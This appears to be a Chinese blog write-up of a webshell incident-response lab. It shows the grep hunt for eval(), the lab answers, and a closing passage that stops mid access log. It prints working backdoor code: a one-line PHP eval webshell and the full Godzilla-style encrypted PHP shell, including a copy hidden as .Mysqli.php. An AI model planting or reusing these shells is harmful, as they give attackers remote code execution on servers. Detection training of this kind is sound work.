

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/biaotou.png">
  <link rel="icon" href="/img/biaotou.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="orange">
  <meta name="keywords" content="">
  
    <meta name="description" content="第一章 应急响应-webshell查杀 12345靶机账号密码 root xjwebshell1.黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;2.黑客使用的什么工具的shell github地址的md5 flag&#123;md5&#125;3.黑客隐藏shell的完整路径的md5 flag&#123;md5&#125;">
<meta property="og:type" content="article">
<meta property="og:title" content="Re:从零开始的玄机的应急响应生活">
<meta property="og:url" content="https://0ran9ewww.github.io/2025/03/02/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/Re%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E7%8E%84%E6%9C%BA%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%94%9F%E6%B4%BB/index.html">
<meta property="og:site_name" content="0raN9e的笔记">
<meta property="og:description" content="第一章 应急响应-webshell查杀 12345靶机账号密码 root xjwebshell1.黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;2.黑客使用的什么工具的shell github地址的md5 flag&#123;md5&#125;3.黑客隐藏shell的完整路径的md5 flag&#123;md5&#125;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://0ran9ewww.github.io/2025/03/02/images/%E7%8E%84%E6%9C%BA//2025-03-05194159.png">
<meta property="og:image" content="https://0ran9ewww.github.io/2025/03/02/images/%E7%8E%84%E6%9C%BA//2025-03-05195709.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-05200028.png">
<meta property="og:image" content="https://0ran9ewww.github.io/2025/03/02/images/%E7%8E%84%E6%9C%BA//2025-03-05200628.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-05200840.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-10191905.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-10191733.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-10192422.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-10192606.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-10194051.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09121606.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09122112.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09122112.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09123957.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09124445.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09131415.png">
<meta property="og:image" content="https://0ran9ewww.github.io/2025/03/02/images/%E7%8E%84%E6%9C%BA//2025-03-09131731.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09131913.png">
<meta property="og:image" content="https://0ran9ewww.github.io/2025/03/02/images/%E7%8E%84%E6%9C%BA//2025-03-09144418.png">
<meta property="og:image" content="https://0ran9ewww.github.io/2025/03/02/images/%E7%8E%84%E6%9C%BA//2025-03-09144706.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09144751.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09144848.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09144948.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09153059.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09154748.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09160559.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09161013.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09162759.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09163152.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09164030.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09163815.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09172823.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09173203.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09173315.png">
<meta property="og:image" content="https://0ran9ewww.github.io/2025/03/02/images/%E7%8E%84%E6%9C%BA//2025-03-09180735.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09181845.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09183755.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09215030.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-09220123.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-06193354.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-06193736.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-06194335.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-06202650.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-06202915.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-05212604.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-05214009.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-10181914.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-10183408.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-10200649.png">
<meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-10211037.png">
<meta property="article:published_time" content="2025-03-02T13:00:00.000Z">
<meta property="article:modified_time" content="2025-03-10T13:22:36.738Z">
<meta property="article:author" content="orange">
<meta property="article:tag" content="应急响应">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://0ran9ewww.github.io/2025/03/02/images/%E7%8E%84%E6%9C%BA//2025-03-05194159.png">
  
  
  
  <title>Re:从零开始的玄机的应急响应生活 - 0raN9e的笔记</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"0ran9ewww.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"mhU37D1jfBAPsc6SNIXmdLb0-gzGzoHsz","app_key":"z8mFsDgOSQqDw1luWGGbCaCR","server_url":"https://mhu37d1j.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>0raN9e的blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Re:从零开始的玄机的应急响应生活"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-03-02 21:00" pubdate>
          2025年3月2日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          19k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          159 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Re:从零开始的玄机的应急响应生活</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    本文最后更新于 2025年3月10日 晚上
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h1 id="第一章-应急响应-webshell查杀"><a class="markdownIt-Anchor" href="#第一章-应急响应-webshell查杀"></a> 第一章 应急响应-webshell查杀</h1>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">靶机账号密码 root xjwebshell<br>1.黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;<br>2.黑客使用的什么工具的shell github地址的md5 flag&#123;md5&#125;<br>3.黑客隐藏shell的完整路径的md5 flag&#123;md5&#125; 注 : /xxx/xxx/xxx/xxx/xxx.xxx<br>4.黑客免杀马完整路径 md5 flag&#123;md5&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q1"><a class="markdownIt-Anchor" href="#q1"></a> Q1</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-4:~# <span class="hljs-built_in">cd</span> /var/www/html<br>root@ip-10-0-10-4:/var/www/html# <span class="hljs-built_in">ls</span><br>admin       data         index.php    pictures   shell.php    wap<br>api.php     favicon.ico  install.php  README.md  sitemap.php<br>config.php  include      LICENSE      rss.php    template<br>root@ip-10-0-10-4:/var/www/html# <span class="hljs-built_in">cat</span> shell.php<br>&lt;?php phpinfo();@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_REQUEST</span>[1]);?&gt;<br>root@ip-10-0-10-4:/var/www/html# find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> grep -Hn <span class="hljs-string">&quot;eval(&quot;</span> &#123;&#125; \; 2&gt;/dev/null<br>./include/gz.php:23:            <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$payload</span>);<br>./include/Db/.Mysqli.php:22:            <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$payload</span>);<br>./shell.php:1:&lt;?php phpinfo();@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_REQUEST</span>[1]);?&gt;<br></code></pre></td></tr></table></figure>
<p>查找危险函数语句</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> ./ -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;*.php&quot;</span> -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> grep -Hn <span class="hljs-string">&quot;eval(&quot;</span> &#123;&#125; \; <span class="hljs-number">2</span>&gt;/dev/null<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-4:/var/www/html# <span class="hljs-built_in">cat</span> ./include/gz.php<br>&lt;?php<br>@session_start();<br>@set_time_limit(0);<br>@error_reporting(0);<br><span class="hljs-keyword">function</span> encode(<span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span>)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=0;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+1&amp;15];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-built_in">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br>//027ccd04-5065-48b6-a32d-77c704a5e26d<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;3c6e0b8a9c15224a&#x27;</span>;<br><span class="hljs-variable">$data</span>=file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$data</span>!==<span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-variable">$data</span>=encode(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=encode(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=encode(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>                <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-built_in">echo</span> encode(@run(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=encode(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">//<span class="hljs-number">027ccd04</span>-<span class="hljs-number">5065</span>-<span class="hljs-number">48b6</span>-a32d-77c704a5e26d<br></code></pre></td></tr></table></figure>
<h2 id="q2"><a class="markdownIt-Anchor" href="#q2"></a> Q2</h2>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/encapsulation/p/15662851.html">哥斯拉PHP马逐句解析 - 芥末炸弹 - 博客园</a>介绍了内容，去github上找一下</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/BeichenDream/</span>Godzilla<br><span class="hljs-number">39392</span>de3218c333f794befef07ac9257<br></code></pre></td></tr></table></figure>
<h2 id="q3"><a class="markdownIt-Anchor" href="#q3"></a> Q3</h2>
<p>去之前的地方再看看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-4:/var/www/html/include# <span class="hljs-built_in">ls</span> -al<br>total 40<br>drwxr-xr-x 4 www-data www-data  4096 Aug  2  2023 .<br>drwxr-xr-x 8 www-data www-data  4096 Aug  2  2023 ..<br>-rwxr-xr-x 1 www-data www-data  1249 Mar 14  2021 common.php<br>drwxr-xr-x 2 www-data www-data  4096 Aug  2  2023 Db<br>-rwxr-xr-x 1 www-data www-data     0 Mar 14  2021 default.htm<br>-rwxr-xr-x 1 www-data www-data 15364 Mar 14  2021 .DS_Store<br>-rw-r--r-- 1 www-data www-data   808 Aug  2  2023 gz.php<br>-rwxr-xr-x 1 www-data www-data     0 Mar 14  2021 index.htm<br>-rwxr-xr-x 1 www-data www-data     0 Mar 14  2021 index.html<br>drwxr-xr-x 2 www-data www-data  4096 Mar 14  2021 Model<br>root@ip-10-0-10-4:/var/www/html/include# <span class="hljs-built_in">cd</span> Db<br>root@ip-10-0-10-4:/var/www/html/include/Db# <span class="hljs-built_in">ls</span><br>Mysqli.php  Mysql.php  Sqlite.php<br>root@ip-10-0-10-4:/var/www/html/include/Db# <span class="hljs-built_in">ls</span> -al<br>total 36<br>drwxr-xr-x 2 www-data www-data 4096 Aug  2  2023 .<br>drwxr-xr-x 4 www-data www-data 4096 Aug  2  2023 ..<br>-rw-r--r-- 1 www-data www-data  768 Aug  2  2023 .Mysqli.php<br>-rwxr-xr-x 1 www-data www-data 4752 Mar 14  2021 Mysqli.php<br>-rwxr-xr-x 1 www-data www-data 4921 Mar 14  2021 Mysql.php<br>-rwxr-xr-x 1 www-data www-data 4433 Mar 14  2021 Sqlite.php<br>root@ip-10-0-10-4:/var/www/html/include/Db# <span class="hljs-built_in">cat</span> .Mysqli.php<br>&lt;?php<br>@session_start();<br>@set_time_limit(0);<br>@error_reporting(0);<br><span class="hljs-keyword">function</span> encode(<span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span>)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=0;<span class="hljs-variable">$i</span>&lt;strlen(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+1&amp;15];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-built_in">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;3c6e0b8a9c15224a&#x27;</span>;<br><span class="hljs-variable">$data</span>=file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$data</span>!==<span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-variable">$data</span>=encode(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=encode(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=encode(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>                <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-built_in">echo</span> encode(@run(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=encode(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>nclude<span class="hljs-regexp">/Db/</span>.Mysqli.php<br>aebac0e58cd6c5fad1695ee4d1ac1919<br></code></pre></td></tr></table></figure>
<h2 id="q4"><a class="markdownIt-Anchor" href="#q4"></a> Q4</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-4:/var/log# <span class="hljs-built_in">ls</span><br>alternatives.log    auth.log                           btmp.1                 debug       kern.log    mysql           syslog.1<br>alternatives.log.1  auth.log.1                         cloud-init.log         debug.1     kern.log.1  ntpstats        user.log<br>amazon              aws114_ssm_agent_installation.log  cloud-init-output.log  dpkg.log    lastlog     php7.3-fpm.log  user.log.1<br>apache2             bootstrap.log                      daemon.log             dpkg.log.1  messages    private         wtmp<br>apt                 btmp                               daemon.log.1           faillog     messages.1  syslog<br>root@ip-10-0-10-4:/var/log# <span class="hljs-built_in">cd</span> apache2<br>root@ip-10-0-10-4:/var/log/apache2# <span class="hljs-built_in">ls</span><br>access.log  error.log  other_vhosts_access.log<br>root@ip-10-0-10-4:/var/log/apache2# <span class="hljs-built_in">cat</span> access.log<br>192.168.200.2 - - [02/Aug/2023:01:42:19 +0000] <span class="hljs-string">&quot;GET 